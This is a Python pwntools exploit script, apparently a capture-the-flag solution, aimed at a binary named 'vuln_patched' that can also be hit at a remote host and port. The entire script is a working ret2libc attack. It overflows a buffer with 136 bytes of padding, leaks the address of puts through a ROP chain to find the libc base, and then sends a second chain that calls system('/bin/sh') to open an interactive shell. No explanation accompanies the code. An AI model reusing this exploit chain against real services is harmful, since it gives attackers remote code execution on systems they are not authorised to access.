from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './vuln_patched'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

lib = './libc.so.6'
libc = context.binary = ELF(lib, checksec=False)

sh = start()

offsetRsp = 136 # padding to RIP

puts_got = elf.got['puts'] # get the puts@got address
info('Puts Got: %#0x', puts_got)

pop_rdi_gadget = 0x0000000000400913 # get the pop rdi address
info('RDI: %#0x', pop_rdi_gadget)

puts_plt = elf.plt['puts'] # get the puts@plt address
info('Puts PLT: %#0x', puts_plt)

#1st payload -> to leak teh libc run time

p = flat([
    asm('nop')*offsetRsp,
    pop_rdi_gadget,
    puts_got,
    puts_plt,
    elf.sym['do_stuff']
])

sh.sendline(p)

## GET THE LEAKED LIBC ADDRESS

sh.recvline()
sh.recvline()
leaked_libc_runtime = int.from_bytes(sh.recvline(keepends=False), byteorder='little')
info('Leaked libc run time: %#0x', leaked_libc_runtime)

## Calculate the base address
libc_base = leaked_libc_runtime - libc.sym['puts']
info('libc_base: %#0x', libc_base)

## Calculate the binsh address
not_calculated_binsh = next(libc.search(b'/bin/sh\x00'))
info('not Calculated libc binsh: %#0x', not_calculated_binsh)

bin_sh = libc_base + not_calculated_binsh
info('libc /bin/sh address: %#0x', bin_sh)

## Calculate the system address
system_address = libc_base + libc.sym['system']
info('libc system address: %#0x', system_address)

## 2nd payload

pay = flat([
    asm('nop')*offsetRsp,
    pop_rdi_gadget,
    puts_got,
    puts_plt,
    pop_rdi_gadget,
    bin_sh,
    system_address
]) 

sh.sendline(pay)

sh.interactive()
